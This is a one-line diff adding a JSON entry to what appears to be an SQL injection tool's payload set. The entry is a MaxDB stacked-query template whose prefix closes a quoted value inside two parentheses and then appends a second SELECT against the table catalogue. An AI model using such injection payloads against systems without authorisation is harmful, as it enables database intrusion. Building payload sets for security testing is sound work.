@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "stacked", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B}; SELECT (SELECT COUNT(*) FROM DOMAIN.TABLES)", "comment": "maxdb stacked: single in 2 parens ws"}
